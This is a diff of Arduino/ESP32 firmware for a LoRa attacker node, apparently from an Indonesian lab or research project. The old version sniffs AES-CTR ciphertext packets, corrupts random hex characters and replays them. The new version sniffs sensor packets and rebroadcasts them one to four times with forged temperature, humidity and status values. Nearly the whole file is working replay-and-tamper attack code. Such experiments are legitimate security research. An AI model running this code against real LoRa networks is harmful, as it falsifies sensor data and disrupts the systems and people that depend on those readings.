@@ -1,18 +1,3 @@
-/*
-ATTACKER / SNIFFER + AES TAMPER ATTACK LoRa
---------------------------------
-Author: Mohammad Rizki Fadillah
-
-Description:
-- Menyadap paket AES LoRa
-- Mengubah ciphertext AES secara random
-- Replay ciphertext hasil tampering
-- Simulasi integrity attack pada AES-CTR
-
-FOR EDUCATIONAL PURPOSE ONLY
---------------------------------
-*/
-
 #include <SPI.h>
 #include <LoRa.h>
 
@@ -23,8 +8,7 @@ FOR EDUCATIONAL PURPOSE ONLY
 // =====================================
 // PARAMETER
 // =====================================
-const uint32_t EXPECTED = 200;
-
+const uint32_t EXPECTED = 300;
 const unsigned long TIMEOUT_MS = 30000;
 
 // =====================================
@@ -37,137 +21,59 @@ uint32_t replayedCount  = 0;
 uint32_t tamperedCount  = 0;
 
 // =====================================
-// UNIQUE TRACKER
-// =====================================
-bool seen[EXPECTED] = {false};
-
-uint32_t uniqueCount    = 0;
+bool seen[300] = {false};
+uint32_t uniqueCount = 0;
 uint32_t duplicateCount = 0;
 
-// =====================================
-// STATE
-// =====================================
 unsigned long lastRecvTime = 0;
-
 bool started = false;
-bool done    = false;
+bool done = false;
 
 // =====================================
-// VALIDASI PAYLOAD AES
-// FORMAT:
-// ID,CIPHERTEXTHEX
+// VALIDASI PAYLOAD
 // =====================================
 bool isValidPayload(String data, uint32_t &id) {
 
   int p1 = data.indexOf(',');
+  int p2 = data.indexOf(',', p1 + 1);
 
-  if (p1 == -1) {
-    return false;
-  }
+  if (p1 == -1 || p2 == -1) return false;
 
   String idStr = data.substring(0, p1);
 
   for (int i = 0; i < idStr.length(); i++) {
-
-    if (!isDigit(idStr[i])) {
-      return false;
-    }
+    if (!isDigit(idStr[i])) return false;
   }
 
   id = idStr.toInt();
-
-  String cipherHex = data.substring(p1 + 1);
-
-  if (cipherHex.length() <= 0) {
-    return false;
-  }
-
   return true;
 }
 
 // =====================================
-// RANDOM HEX CHAR
+// RANDOM TAMPER FUNCTION
 // =====================================
-char randomHexChar() {
+String tamperPayload(String data) {
 
-  const char hexChars[] =
-    "0123456789ABCDEF";
+  int p1 = data.indexOf(',');
+  int p2 = data.indexOf(',', p1 + 1);
 
-  return hexChars[random(0, 16)];
-}
+  String id = data.substring(0, p1);
+  String ts = data.substring(p1 + 1, p2);
 
-// =====================================
-// TAMPER CIPHERTEXT
-// =====================================
-String tamperCipher(String original) {
+  float fakeTemp = random(50, 500) / 10.0;
+  float fakeHum  = random(50, 1000) / 10.0;
 
-  String tampered = original;
+  String status;
+  int r = random(0, 3);
 
-  // jumlah byte random yang diubah
-  int changes =
-    random(2, 8);
+  if (r == 0) status = "PANAS";
+  else if (r == 1) status = "NORMAL";
+  else status = "DINGIN";
 
-  for (int i = 0; i < changes; i++) {
-
-    int pos =
-      random(0, tampered.length());
-
-    tampered[pos] =
-      randomHexChar();
-  }
-
-  return tampered;
-}
-
-// =====================================
-// SUMMARY
-// =====================================
-void printSummary() {
-
-  float sniffRate =
-    (sniffedCount * 100.0) / EXPECTED;
-
-  float decodeRate =
-    (sniffedCount > 0)
-    ? ((decodedCount * 100.0) / sniffedCount)
-    : 0;
-
-  float packetLoss =
-    100.0 - sniffRate;
-
-  Serial.println("\n========== AES TAMPER SUMMARY ==========");
-
-  Serial.print("Sniffed Total     : ");
-  Serial.println(sniffedCount);
-
-  Serial.print("Decoded Valid     : ");
-  Serial.println(decodedCount);
-
-  Serial.print("Invalid Payload   : ");
-  Serial.println(invalidCount);
-
-  Serial.print("Unique Packet     : ");
-  Serial.println(uniqueCount);
-
-  Serial.print("Duplicate Packet  : ");
-  Serial.println(duplicateCount);
-
-  Serial.print("Replay Sent Total : ");
-  Serial.println(replayedCount);
-
-  Serial.print("Tampered Packet   : ");
-  Serial.println(tamperedCount);
-
-  Serial.print("Sniff Success (%) : ");
-  Serial.println(sniffRate);
-
-  Serial.print("Packet Loss (%)   : ");
-  Serial.println(packetLoss);
-
-  Serial.print("Decode Success(%) : ");
-  Serial.println(decodeRate);
-
-  Serial.println("========================================");
+  return id + "," + ts + "," +
+         String(fakeTemp, 2) + "," +
+         String(fakeHum, 2) + "," +
+         status;
 }
 
 // =====================================
@@ -176,194 +82,105 @@ void printSummary() {
 void setup() {
 
   Serial.begin(115200);
-
-  randomSeed(analogRead(34));
+  randomSeed(micros());
 
   SPI.begin(18, 19, 23, SS);
-
   LoRa.setPins(SS, RST, DIO0);
 
   if (!LoRa.begin(433E6)) {
-
     Serial.println("LoRa init FAILED!");
-
     while (1);
   }
 
-  LoRa.setSpreadingFactor(7);
-
+  LoRa.setSpreadingFactor(9);
   LoRa.setSignalBandwidth(125E3);
-
   LoRa.setCodingRate4(5);
 
   LoRa.receive();
 
-  Serial.println("====================================");
-  Serial.println("AES TAMPER ATTACKER READY");
-  Serial.println("MODE : RANDOM CIPHERTEXT TAMPER");
-  Serial.println("====================================\n");
+  Serial.println("ATTACKER READY");
+  Serial.println("MODE: RANDOM REPLAY + TAMPER");
 }
 
 // =====================================
-// MAIN LOOP
+// LOOP
 // =====================================
 void loop() {
 
-  if (done) {
+  if (done) return;
+
+  int packetSize = LoRa.parsePacket();
+  if (!packetSize) return;
+
+  started = true;
+  lastRecvTime = millis();
+
+  sniffedCount++;
+
+  String data = "";
+  while (LoRa.available()) {
+    data += (char)LoRa.read();
+  }
+
+  if (data.startsWith("ACK,")) {
+    Serial.print("");
+    LoRa.receive();
     return;
   }
 
-  int packetSize = LoRa.parsePacket();
+  uint32_t id = 0;
+  bool valid = isValidPayload(data, id);
 
-  if (packetSize) {
+  if (valid) decodedCount++;
+  else invalidCount++;
 
-    started = true;
+  Serial.print("[SNIFF] ");
+  Serial.println(data);
 
-    lastRecvTime = millis();
+  // =====================================
+  // ATTACK CORE (FIXED RX/TX STABILITY)
+  // =====================================
+  if (valid) {
 
-    sniffedCount++;
+    int replayTimes = random(1, 5);
 
-    String data = "";
+    Serial.print("[ATTACK] Replay x");
+    Serial.println(replayTimes);
 
-    while (LoRa.available()) {
-      data += (char)LoRa.read();
-    }
+    // TX burst tanpa ganggu RX tiap loop
+    LoRa.idle();
 
-    // =====================================
-    // VALIDASI
-    // =====================================
-    uint32_t id = 0;
+    for (int i = 0; i < replayTimes; i++) {
 
-    bool valid = isValidPayload(data, id);
+      delay(random(150, 600));
 
-    if (valid) {
-
-      decodedCount++;
-
-      if (id < EXPECTED) {
-
-        if (!seen[id]) {
-
-          seen[id] = true;
-
-          uniqueCount++;
-
-        } else {
-
-          duplicateCount++;
-        }
-      }
-
-    } else {
-
-      invalidCount++;
-    }
-
-    // =====================================
-    // LOG SNIFF
-    // =====================================
-    Serial.print("[SNIFF AES] ");
-
-    Serial.print(data);
-
-    Serial.print(" | RSSI=");
-
-    Serial.print(LoRa.packetRssi());
-
-    Serial.print(" | SNR=");
-
-    Serial.print(LoRa.packetSnr());
-
-    Serial.println();
-
-    // =====================================
-    // AES TAMPER ATTACK
-    // =====================================
-    if (valid && data != "") {
-
-      int commaIdx =
-        data.indexOf(',');
-
-      String packetId =
-        data.substring(0, commaIdx);
-
-      String cipherHex =
-        data.substring(commaIdx + 1);
-
-      // tamper ciphertext
-      String tamperedCipher =
-        tamperCipher(cipherHex);
-
-      String tamperedPayload =
-        packetId + "," + tamperedCipher;
+      String tampered = tamperPayload(data);     // ini mode replay + tamper, uncomment untuk replay dengan tamper
+      // String tampered = data;                       // ini mode replay murni, uncomment untuk replay tanpa tamper
 
       tamperedCount++;
+      replayedCount++;
 
-      int replayTimes =
-        random(1, 6);
+      Serial.print("[TAMPER] ");      // ini log untuk payload yang sudah ditamper, uncomment untuk melihat payload yang sudah ditamper 
+      // Serial.print("[REPLAY] ");      // ini log untuk payload yang direplay, uncomment untuk melihat payload yang direplay (baik yang tamper maupun yang tidak tamper)
+      Serial.println(tampered);
 
-      Serial.print("[ATTACK] Replay Count = ");
-
-      Serial.println(replayTimes);
-
-      for (int i = 0; i < replayTimes; i++) {
-
-        int randomDelay =
-          random(300, 900);
-
-        delay(randomDelay);
-
-        replayedCount++;
-
-        Serial.print("[TAMPER REPLAY ");
-
-        Serial.print(i + 1);
-
-        Serial.print("/");
-
-        Serial.print(replayTimes);
-
-        Serial.print("] ");
-
-        Serial.println(tamperedPayload);
-
-        // =====================================
-        // SEND TAMPERED CIPHERTEXT
-        // =====================================
-        LoRa.beginPacket();
-
-        LoRa.print(tamperedPayload);
-
-        LoRa.endPacket();
-
-        LoRa.receive();
-      }
+      LoRa.beginPacket();
+      LoRa.print(tampered);
+      LoRa.endPacket();
     }
 
-    // =====================================
-    // STOP TARGET
-    // =====================================
-    if (sniffedCount >= EXPECTED) {
-
-      printSummary();
-
-      done = true;
-    }
+    // RX diaktifkan sekali setelah burst selesai
+    LoRa.receive();
   }
 
   // =====================================
-  // TIMEOUT
+  // STOP CONDITION
   // =====================================
-  if (
-    started &&
-    !done &&
-    (millis() - lastRecvTime > TIMEOUT_MS)
-  ) {
+  if (sniffedCount >= EXPECTED) {
+    done = true;
+  }
 
-    Serial.println("\n[TIMEOUT] No new packet 30s");
-
-    printSummary();
-
+  if (started && (millis() - lastRecvTime > TIMEOUT_MS)) {
     done = true;
   }
 }
